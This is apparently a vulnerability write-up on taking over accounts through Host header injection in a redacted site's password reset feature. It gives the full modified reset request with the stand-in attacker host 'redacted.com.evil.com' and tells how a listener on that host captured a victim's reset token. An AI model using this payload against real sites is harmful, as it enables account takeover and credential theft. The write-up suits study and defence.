# Account takeover using Host header injection

**Description:**

Most web applications that involves user authentication must implement password reset feature to allow its users accessing their account on password lost.
The reset password flow is fairly simple -

1. [Client] Submit username/email using a form
2. [Server] Generates a temporary reset token that will be linked to the requested username
3. [Server] Sends an email to the client using SMTP with the reset link
4. [Client] Receives an email with a link that points to the server's address with the secret token

## Scenario 1

Website that serves an ASP application with an open registration allow its users to cover their password using `Lost Password` feature.

After registering for a user, I tried to figure how does the password recovery procedure works, lets start by recovering our own account and check our email.

We have received a link that points to the application domain with the reset token in the `rt` parameter -

![Reset link](https://i.gyazo.com/e387462b7f43e086fe6126964715032d.png)

So what is the scenario here? very simple, inject our own controlled domain that hosts a webserver so when the user clicks on the link we will get his token immediately.  
You might notice that the link arrives in an hyperlink, which hides the hostname within, might gain us a few more stealth points.

When I hit back the reset form, I tried a few techniques that kept failing, ex: send `X-Forwarded-Host` header, replace `Host` header with our own one.
After fuzzing around the `Host` header, I have found that the server must receive the whole original domain without any modifications, so how can we still control it and keep it whole?

![Huh?](https://media.giphy.com/media/kc0kqKNFu7v35gPkwB/giphy.gif)

Setting our controlled domain as **suffix** within the `Host` header bypass the server's check, but also sends us an email pointing to our **domain** (evil.com)!
The modified password reset request -

```
POST /account/LostPassword HTTP/1.1
Host: redacted.com.evil.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate

__RequestVerificationToken=[VerificationToken]&Email=[InputEmail]
```

The received email has our domain within its hyperlink, which contains the original domain as our subdomain that can be easily handled by create the subdomain **or** just set it in the `hosts` file (enough for this PoC).
After settings our listener on port 80 and hitting the link, we got the victim's token and we're able to reset his password.

![Voila](https://i.gyazo.com/be3039cd5ef990179e3c574b9479cf3f.png)
